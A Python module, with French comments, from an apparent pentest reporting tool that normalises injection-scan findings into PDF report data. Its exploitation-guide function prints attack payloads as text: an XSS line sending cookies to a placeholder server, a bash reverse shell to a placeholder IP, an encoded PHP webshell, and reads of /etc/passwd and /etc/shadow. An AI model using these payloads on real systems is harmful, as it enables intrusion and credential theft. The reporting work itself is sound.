"""Normalisation des résultats InjectionHunter vers un format agrégé compatible
avec le PDF generator de `a02_security_misconfiguration.reporting.pdf_report`.

Contrat (sortie):
- dict `aggregated` avec clés: target, status, mode, project, started_at,
  duration_seconds, results[], summary{}, metadata{}
- chaque élément de `results[]` est un "scan" (scan_type) contenant `findings[]`
  avec: title, severity, confidence, risk, recommendation, evidence.

On reste volontairement simple: l'objectif est d'avoir un PDF propre et homogène.
"""

from __future__ import annotations

from collections import Counter
from dataclasses import dataclass
from datetime import datetime
from typing import Any, Dict, Iterable, List, Optional


_SEV_ORDER = ["INFO", "LOW", "MEDIUM", "HIGH", "CRITICAL"]
_CONF_ORDER = ["low", "medium", "high"]


def _norm_sev(s: Any) -> str:
    v = str(s or "INFO").upper().strip()
    return v if v in _SEV_ORDER else "INFO"


def _norm_conf(s: Any) -> str:
    v = str(s or "low").lower().strip()
    return v if v in _CONF_ORDER else "low"


def _max_severity(values: Iterable[str]) -> str:
    vals = [_norm_sev(v) for v in values]
    if not vals:
        return "INFO"
    return max(vals, key=lambda x: _SEV_ORDER.index(x))


def _max_confidence(values: Iterable[str]) -> str:
    vals = [_norm_conf(v) for v in values]
    if not vals:
        return "low"
    return max(vals, key=lambda x: _CONF_ORDER.index(x))


def _severity_from_injection_type(vuln_type: str) -> str:
    t = (vuln_type or "").lower().strip()
    mapping = {
        "sqli": "CRITICAL",
        "cmdi": "CRITICAL",
        "deserialization": "CRITICAL",
        "deserialization_injection": "CRITICAL",
        "lfi": "HIGH",
        "ssrf": "HIGH",
        "template_injection": "HIGH",
        "xpath": "HIGH",
        "ldap": "HIGH",
        "xss": "MEDIUM",
        "orm": "MEDIUM",
        "websocket_injection": "MEDIUM",
        "admin": "LOW",
        "cms": "LOW",
        "cookie": "LOW",
        "session_variation": "INFO",
        "form": "INFO",
        "config_violation": "LOW",
        "asvs_violation": "INFO",
        "missing_security_headers": "LOW",
        "backup_file_exposed": "MEDIUM",
        "directory_listing": "LOW",
    }
    return mapping.get(t, "INFO")


def _confidence_from_vuln(v: Dict[str, Any]) -> str:
    # Heuristique: si on a preuve + url + payload => high
    has_evidence = bool(v.get("evidence"))
    has_payload = bool(v.get("payload"))
    has_url = bool(v.get("url"))
    score = sum([has_evidence, has_payload, has_url])
    return "high" if score >= 2 else ("medium" if score == 1 else "low")


def _risk_text(vuln_type: str) -> str:
    t = (vuln_type or "").lower().strip()
    if t == "sqli":
        return "Injection SQL pouvant mener à exfiltration de données, contournement d'authentification et compromission du système."
    if t == "xss":
        return "Exécution de JavaScript côté navigateur pouvant mener à vol de session, actions à la place de l'utilisateur, ou défiguration."
    if t == "cmdi":
        return "Injection de commandes système pouvant mener à exécution de code à distance (RCE) et prise de contrôle du serveur."
    if t in {"lfi", "template_injection", "deserialization", "ssrf"}:
        return "Vulnérabilité d'injection pouvant mener à lecture de fichiers, SSRF, escalade et/ou exécution de code selon le contexte."
    return "Vulnérabilité d'injection (risque à évaluer selon le contexte applicatif)."


def _recommendation_text(vuln_type: str) -> str:
    t = (vuln_type or "").lower().strip()
    if t == "sqli":
        return "Utiliser des requêtes paramétrées (prepared statements) / ORM, valider côté serveur, et interdire la concaténation SQL."
    if t == "xss":
        return "Échapper les sorties selon le contexte (HTML/JS/URL), activer CSP, et éviter l'injection de HTML non fiable."
    if t == "cmdi":
        return "Ne jamais concaténer des entrées utilisateur dans des commandes; utiliser des API sûres et une validation stricte (allow-list)."
    if t == "lfi":
        return "Ne pas construire de chemins via input utilisateur; utiliser allow-list et désactiver wrappers dangereux; appliquer le moindre privilège."
    if t == "ssrf":
        return "Bloquer/filtrer les URLs vers réseaux internes, valider schémas/hosts, et utiliser des allow-lists + DNS pinning."
    return "Valider strictement les entrées, encoder/échapper selon le contexte, et appliquer des contrôles côté serveur."


def _explanation_text(vuln_type: str) -> str:
    """Description technique de la vulnérabilité pour le pentester."""
    t = (vuln_type or "").lower().strip()
    if t == "sqli":
        return "L'application concatène l'entrée utilisateur directement dans une requête SQL sans préparation ni échappement. Le serveur exécute donc du SQL injecté, ce qui permet de modifier la requête (WHERE, UNION, sous-requêtes), d'extraire des données, de contourner l'authentification ou d'écrire des fichiers selon les droits DB."
    if t == "xss":
        return "L'application réfléchit ou stocke des données utilisateur dans la page sans les échapper dans le contexte HTML/JS. Un attaquant peut injecter du JavaScript qui s'exécute dans le navigateur de la victime (vol de cookie/session, keylogger, redirection, actions au nom de l'utilisateur)."
    if t == "cmdi":
        return "Une entrée utilisateur est passée à une fonction d'exécution de commandes système (exec, system, shell, etc.) sans validation. L'attaquant peut exécuter des commandes arbitraires sur le serveur (lecture de fichiers, reverse shell, persistance)."
    if t == "lfi":
        return "Un paramètre (file, path, include, etc.) est utilisé pour inclure ou lire un fichier dont le chemin est contrôlable. En traversée de répertoires (../) ou via des wrappers (php://filter, data://), on peut lire des fichiers sensibles ou exécuter du code."
    if t == "ssrf":
        return "L'application fait une requête HTTP (ou autre) vers une URL fournie par l'utilisateur. On peut pointer vers des services internes (metadata cloud, DB, admin) ou des schémas dangereux (file://) pour contourner le pare-feu."
    if t in ("template_injection", "ssti"):
        return "L'entrée est rendue par un moteur de templates côté serveur (Jinja2, Twig, etc.). En injectant des expressions du moteur ({{ 7*7 }}, accès aux objets), on peut lire des données, exécuter du code ou obtenir RCE."
    if t == "deserialization":
        return "Des données sérialisées (PHP, Java, Python pickle, .NET) sont désérialisées sans contrôle. En injectant un payload contenant des gadgets (chaînes d'appels), on peut déclencher RCE, lecture de fichiers ou SSRF."
    if t in ("ldap", "xpath", "orm"):
        return "L'entrée est concaténée dans une requête LDAP, XPath ou ORM sans échappement. On peut modifier la requête pour contourner les filtres, énumérer des entrées ou extraire des données."
    if t == "form":
        return "Formulaire identifié sans token CSRF ou avec des champs sensibles exposés. Utile pour préparer des tests CSRF, brute-force ou injection sur les champs découverts."
    return "Vulnérabilité d'injection détectée : l'entrée utilisateur influence le comportement du système de manière non sécurisée."


def _exploitation_guide(vuln_type: str, v: Dict[str, Any]) -> str:
    """Guide d'exploitation concret pour le pentester (étapes, commandes, outils)."""
    t = (vuln_type or "").lower().strip()
    param = v.get("param") or v.get("path") or v.get("name") or "PARAM"
    url = v.get("url") or ""
    payload = v.get("payload") or ""

    if t == "sqli":
        return (
            "1) Vérifier le type (erreur / booléen / time / union). Exemple erreur : remplacer la valeur par une quote "
            "pour confirmer la sortie d'erreur SQL.\n"
            "2) Énumérer les colonnes : ORDER BY 1, 2, ... jusqu'à erreur ; ou UNION SELECT NULL,NULL,...\n"
            "3) Extraire les données : UNION SELECT table_name FROM information_schema.tables (MySQL) ; "
            "adapter pour PostgreSQL/Oracle. Puis UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' ; "
            "puis UNION SELECT concat(user,0x3a,password) FROM users.\n"
            "4) Outils : sqlmap -u \"{}\" -p {} --batch (ou --risk=3 --level=5). Pour blind : --technique=T.\n"
            "5) Contournement auth : payload du type ' OR '1'='1 ou ' UNION SELECT 1,'admin','hash'-- selon la requête."
        ).format(url or "<URL>", param)
    if t == "xss":
        return (
            "1) Confirmer le reflet : le payload doit apparaître dans la réponse (GET/POST). Vérifier le contexte "
            "(HTML, attribut, JavaScript) pour adapter le payload (fermeture de tag, event handler, etc.).\n"
            "2) Vol de session : injecter <script>fetch('https://VOTRE_SERVEUR/?c='+document.cookie)</script> "
            "et récupérer les cookies sur votre serveur (ngrok, VPS).\n"
            "3) Keylogger / phishing : exfiltrer les frappes ou le contenu du DOM vers votre endpoint.\n"
            "4) Outils : BeEF, XSS Hunter ; manuellement avec Burp Repeater en modifiant le paramètre {}."
        ).format(param)
    if t == "cmdi":
        return (
            "1) Confirmer l'exécution : payload time-based (sleep 5) ou ; id / | cat /etc/passwd.\n"
            "2) Lire des fichiers : ; cat /etc/passwd ou type C:\\Windows\\win.ini selon l'OS.\n"
            "3) Reverse shell : ; bash -i >& /dev/tcp/VOTRE_IP/4444 0>&1 (écouter avec nc -lvnp 4444).\n"
            "4) Encodage si filtrage : base64, $IFS, variables d'environnement pour contourner les espaces/mots bannis.\n"
            "5) Outils : commix -u \"{}\" ; ou manuellement via Burp."
        ).format(url or "<URL>")
    if t == "lfi":
        return (
            "1) Traversée : ../../../etc/passwd (ou ..%2f..%2f..%2fetc%2fpasswd). Adapter le nombre de ../ selon le chemin de base.\n"
            "2) Wrappers PHP : php://filter/convert.base64-encode/resource=index.php pour lire du PHP en base64 ; "
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJyk7 pour exécution de code si allow_url_include.\n"
            "3) Fichiers sensibles : /etc/shadow, .env, config.php, web.config.\n"
            "4) Outil : dotdotpwn ou manuellement avec Burp Intruder sur le paramètre {}."
        ).format(param)
    if t == "ssrf":
        return (
            "1) Tester des cibles internes : http://127.0.0.1:80, http://169.254.169.254/latest/meta-data/ (AWS), "
            "http://metadata.google.internal/ (GCP).\n"
            "2) Bypass : encodage (127.0.0.1 en décimal/hex), @, #, DNS rebinding, autre schéma (file://, dict://).\n"
            "3) Scanner les ports internes en variant le port dans l'URL et en observant les délais ou le contenu.\n"
            "4) Outils : Gopherus pour exploiter Redis/MySQL via SSRF ; manuellement avec Burp."
        )
    if t in ("template_injection", "ssti"):
        return (
            "1) Identifier le moteur : {{{{ 7*7 }}}} -> 49 (Jinja2/Twig) ; ${{{{ 7*7 }}}} (Freemarker/Velocity).\n"
            "2) RCE : Jinja2 class.__mro__ puis chercher os.popen ; Twig map('system'). Adapter selon la doc du moteur.\n"
            "3) Outil : tplmap -u \"{}\"."
        ).format(url or "<URL>")
    if t == "deserialization":
        return (
            "1) Identifier le format : PHP (O:8:\"stdClass\"), Java (rO0...), Python (pickle), .NET.\n"
            "2) Générer un payload : ysoserial (Java), phpggc (PHP), pickle (Python). Envoyer en POST/cookie selon le point d'entrée.\n"
            "3) Chaîne typique : désérialisation → appel de méthode dangereuse (Runtime.exec, system, etc.) via gadget.\n"
            "4) Tester en local d'abord ; adapter le payload à la classe/jar exposée."
        )
    if t in ("ldap", "xpath", "orm"):
        return (
            "1) LDAP : injecter ) ou * dans le filtre ; (*)(uid=*)) pour bypass ; énumérer avec (objectClass=*).\n"
            "2) XPath : ' or '1'='1 ; union avec concat() pour extraire des nœuds.\n"
            "3) ORM : adapter les payloads selon le langage (HQL, Doctrine, etc.) ; souvent similaire à SQLi avec une syntaxe spécifique.\n"
            "4) Rejouer la requête dans Burp en modifiant le paramètre {}."
        ).format(param)
    if t == "form":
        return (
            "1) Reproduire le formulaire dans Burp (Repeater / Intruder).\n"
            "2) Tester CSRF : créer une page HTML qui soumet le formulaire vers la cible ; ouvrir en tant que victime.\n"
            "3) Tester les champs pour injection (SQLi, XSS) et brute-force (login) si applicable."
        )
    return (
        "Reproduire la requête dans Burp (URL/paramètres ci-dessous). Adapter les payloads selon le contexte "
        "et la stack technique (voir CWE et documentation OWASP)."
    )


def _cwe_from_vuln(v: Dict[str, Any]) -> str:
    try:
        import sys
        from pathlib import Path
        repo_injection = Path(__file__).resolve().parents[1]
        if str(repo_injection) not in sys.path:
            sys.path.insert(0, str(repo_injection))
        from constants import VULN_TYPE_TO_CWE
        t = (v.get("type") or "").strip().lower()
        return VULN_TYPE_TO_CWE.get(t, "CWE-74")
    except Exception:
        return v.get("cwe") or "CWE-74"


def _finding_from_vuln(v: Dict[str, Any]) -> Dict[str, Any]:
    vuln_type = str(v.get("type", "")).strip()
    sev = _norm_sev(v.get("severity") or _severity_from_injection_type(vuln_type))
    conf = _norm_conf(v.get("confidence") or _confidence_from_vuln(v))
    cwe = v.get("cwe") or _cwe_from_vuln(v)

    subject = (
        v.get("param") or v.get("path") or v.get("name") or v.get("session_id")
        or v.get("file") or v.get("directory") or v.get("requirement") or v.get("action")
        or "(cible)"
    )
    title = f"{vuln_type.upper()}: {subject}" if vuln_type else f"Injection: {subject}"

    evidence_parts = []
    if v.get("evidence"):
        evidence_parts.append(f"Evidence: {v.get('evidence')}")
    if v.get("payload"):
        evidence_parts.append(f"Payload: {v.get('payload')}")
    if v.get("url"):
        evidence_parts.append(f"URL: {v.get('url')}")
    if cwe and cwe != "INFO":
        evidence_parts.append(f"CWE: {cwe}")

    evidence = "\n".join(evidence_parts).strip() or "Preuve non fournie (résultat heuristique)."

    return {
        "title": title,
        "severity": sev,
        "confidence": conf,
        "cwe": cwe,
        "risk": v.get("risk") or _risk_text(vuln_type),
        "recommendation": v.get("recommendation") or _recommendation_text(vuln_type),
        "evidence": evidence,
        "explanation": v.get("explanation") or _explanation_text(vuln_type),
        "exploitation": v.get("exploitation") or _exploitation_guide(vuln_type, v),
    }


def aggregate_injection_run(
    *,
    target: str,
    vulnerabilities: List[Dict[str, Any]],
    started_at: Optional[str] = None,
    duration_seconds: Optional[float] = None,
    mode: str = "aggressive",
    project: str = "Pentest Assistant",
    metadata: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Transforme une liste de vulnérabilités InjectionHunter en format agrégé."""

    started_at = started_at or datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    metadata = dict(metadata or {})

    # Branding (cover + titre PDF)
    from pathlib import Path

    repo_root = Path(__file__).resolve().parents[2]
    injection_logo = repo_root / "injection" / "image" / "logoinjection.png"

    # Générer un vrai PNG si manquant/vide
    try:
        from .logo_generator import ensure_injection_logo

        ensure_injection_logo(injection_logo)
    except Exception:
        pass

    metadata.setdefault(
        "brand",
        {
            "pdf_title": "A05 – Injection Scan Report",
            "cover_title": "Audit de sécurité – OWASP Top 10:2025",
            "cover_subtitle": "A05 – Injection",
            "cover_tagline": "Rapport de scan automatisé (best-effort)",
            "logo_path": str(injection_logo),
            "objective_text": (
                "Fournir une synthèse claire des vulnérabilités d’injection (A05) détectées automatiquement, "
                "afin d’aider à prioriser les corrections et préparer une validation manuelle."
            ),
            "scope_text": (
                "Analyse automatisée best-effort (sans exploitation). Les résultats peuvent contenir des faux positifs/negatifs. "
                "Une validation manuelle est recommandée, surtout pour les points HIGH/CRITICAL."
            ),
        },
    )

    # 1) regrouper par type = scan_type
    by_type: Dict[str, List[Dict[str, Any]]] = {}
    for v in vulnerabilities or []:
        t = str(v.get("type") or "unknown").strip() or "unknown"
        by_type.setdefault(t, []).append(v)

    results: List[Dict[str, Any]] = []
    total_findings = 0
    for t, vulns in sorted(by_type.items(), key=lambda kv: kv[0]):
        findings = [_finding_from_vuln(v) for v in vulns]
        total_findings += len(findings)
        results.append(
            {
                "scan_type": f"A05_{t}",
                "target": target,
                "status": "COMPLETED",
                "severity": _max_severity([f["severity"] for f in findings] or ["INFO"]),
                "confidence": _max_confidence([f["confidence"] for f in findings] or ["low"]),
                "findings": findings,
                "metadata": {"count": len(findings)},
            }
        )

    scan_sevs = [_norm_sev(r.get("severity")) for r in results] or ["INFO"]
    scan_confs = [_norm_conf(r.get("confidence")) for r in results] or ["low"]

    findings_by_sev = Counter(_norm_sev(f["severity"]) for r in results for f in (r.get("findings") or []))
    scans_by_sev = Counter(scan_sevs)

    aggregated: Dict[str, Any] = {
        "target": target,
        "status": "COMPLETED",
        "mode": mode,
        "project": project,
        "started_at": started_at,
        "duration_seconds": float(duration_seconds) if duration_seconds is not None else None,
        "results": results,
        "summary": {
            "total_scans": len(results),
            "total_findings": total_findings,
            "scans_by_severity": {k: int(scans_by_sev.get(k, 0)) for k in _SEV_ORDER},
            "findings_by_severity": {k: int(findings_by_sev.get(k, 0)) for k in _SEV_ORDER},
            "overall_severity": _max_severity(scan_sevs),
            "overall_confidence": _max_confidence(scan_confs),
            # Le PDF A02 attend parfois ce champ (sinon fallback), on lui donne une forme compatible.
            "a02_risk_score": {
                "level": _max_severity(scan_sevs),
                "confidence": _max_confidence(scan_confs),
                "explain": "Score global heuristique (mapping injection → sévérité).",
            },
            "by_scan": [
                {
                    "scan_type": r.get("scan_type"),
                    "findings": len(r.get("findings") or []),
                    "max_severity": _norm_sev(r.get("severity")),
                    "confidence": _norm_conf(r.get("confidence")),
                    "status": r.get("status", "COMPLETED"),
                }
                for r in results
            ],
        },
        "metadata": {
            **metadata,
            "schema": "injection->a02_aggregated:v1",
        },
    }

    # Nettoyer duration_seconds si None (pour éviter des affichages bizarres)
    if aggregated["duration_seconds"] is None:
        aggregated.pop("duration_seconds", None)

    return aggregated
